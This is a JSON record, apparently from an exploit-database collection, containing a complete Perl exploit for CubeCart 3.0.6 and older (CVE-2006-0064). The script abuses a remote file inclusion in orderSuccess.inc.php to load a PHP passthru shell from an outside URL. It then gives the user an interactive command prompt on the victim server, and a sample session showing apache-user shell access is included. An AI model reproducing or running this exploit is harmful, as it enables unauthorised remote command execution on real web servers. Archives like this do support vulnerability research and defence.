{
  "id": "1398",
  "title": "CubeCart 3.0.6 - Remote Command Execution",
  "cve": "CVE-2006-0064",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#\r\n# cijfer-ccxpl - CubeCart <=3.0.6 Remote Command Execution Exploit\r\n#\r\n# Copyright (c) 2005 cijfer <cijfer@netti.fi>\r\n# All rights reserved.           \r\n#\r\n## 1. example\r\n#\r\n# [cijfer@kalma:/research]$ perl ./cijfer-ccxpl.pl -h www.xxx.com -d\r\n# [cijfer@www.xxx.com /]$ id;uname -a\r\n# uid=48(apache) gid=48(apache) groups=48(apache),2523(psaserv)\r\n# Linux server.xxx.com 2.6.10-1.771_FC2 #1 Mon Mar 28 00:50:14 EST 2005 i686 i686 i386 GNU/Linux\r\n#\r\n# [cijfer@www.xxx.com /]$\r\n#\r\n## 2. explanation\r\n#\r\n# a serious bug was discovered by me in CubeCart 3.0.6 and below which an attacker\r\n# can remotely execute arbitrary commands via 'includes/orderSuccess.inc.php' where  \r\n# passing input to the 'glob' and 'cart_order_id' variable, we can attain access to\r\n# passing input to the 'glob[rootDir]' variable, and include a remote execution script\r\n# to execute arbitrary commands. as usual, this requires 'register_globals' to be\r\n# enabled in order to successfully do this, otherwise a 403 error will show.\r\n#\r\n## 3. the bug\r\n#\r\n# this below allows us to bypass the 403 error...\r\n#\r\n#       <?\r\n#       ...\r\n#       if(!isset($glob)){                                              [1]\r\n#       ...\r\n#\r\n# pass more positive input to $cart_order_id and do you notice what is wrong here?\r\n#       ...\r\n#       if(isset($cart_order_id) && !empty($cart_order_id)){            [2]\r\n#               // build thank you and confirmation email\r\n#               include($glob['rootDir'].\"/classes/htmlMimeMail.php\");  [3] !dangerous!\r\n#               $mail = new htmlMimeMail();\r\n#       ...\r\n#\r\n## 4. the php shell\r\n#\r\n# this exploit grabs data via regular expression strings. foreign php shell\r\n# scripts will not work with this exploit. use the following code along with\r\n# this exploit and put it in 'cmd.txt' or whatever you please:\r\n#\r\n#       <?passthru($_GET[cmd]);?>\r\n#\r\n## 5. the greets\r\n#\r\n# kippis to Zodiac, felosi, and odz. also shouts to lethal & hexy\r\n#\r\n##\r\n#\r\n# $Id: cijfer-ccxpl.pl,v 0.2 2005/12/30 06:02:00 cijfer Exp cijfer $\r\n\r\nuse Getopt::Std;\r\nuse IO::Socket;\r\nuse URI::Escape;\r\n\r\ngetopts(\"h:d:\");\r\n\r\n$host = $opt_h;\r\n$dirs = $opt_d;\r\n$shel = \"http://website.com/cmd.txt\";    # cmd shell url\r\n$cmdv = \"cmd\";                           # cmd variable (ex. passthru($_GET[cmd]);)\r\n$good = 0;\r\n\r\nif(!$host||!$dirs)\r\n{\r\n        print \"cijfer-ccxpl.pl by cijfer\\n\";\r\n        print \"usage: $0 -h cijfer.xxx -d /cubecart\\r\\n\";\r\n        print \"usage: $0 -h <hostname> -d <directory>\\r\\n\";\r\n        exit();\r\n}\r\n\r\nwhile()\r\n{\r\n        print \"[cijfer@\".$host.\" /]\\$ \";\r\n        while(<STDIN>)\r\n        {\r\n                $cmds=$_;\r\n                chomp($cmds);\r\n                last;\r\n        }\r\n\r\n        $string  = $dirs;\r\n        $string .= \"/includes/orderSuccess.inc.php?\";\r\n        $string .= uri_escape($cmdv);\r\n        $string .= \"=\";\r\n        $string .= \"%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B\";\r\n        $string .= uri_escape($cmds).\";echo\";\r\n        $string .= \"%3B%65%63%68%6F%20%5F%45%4E%44%5F;echo;\";\r\n        $string .= \"&glob=1&cart_order_id=1&glob[rootDir]=\";\r\n        $string .= $shel;\r\n        $string .= \"?\";\r\n\r\n        $sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => $host, PeerPort => 80) || die \"error: connect()\\n\";\r\n\r\n        print $sock \"GET $string HTTP/1.1\\n\";\r\n        print $sock \"Host: $host\\n\";\r\n        print $sock \"Accept: */*\\n\";\r\n        print $sock \"Connection: close\\n\\n\";\r\n\r\n        while($result = <$sock>)\r\n        {\r\n                if($result =~ /^_END_/)\r\n                {\r\n                        $good=0;\r\n                }\r\n\r\n                if($good==1)\r\n                {\r\n                        print $result;\r\n                }\r\n\r\n                if($result =~ /^_START_/)\r\n                {\r\n                        $good=1;\r\n                }\r\n        }\r\n}\r\n\r\n# milw0rm.com [2005-12-30]",
  "url": "https://www.exploit-db.com/exploits/1398"
}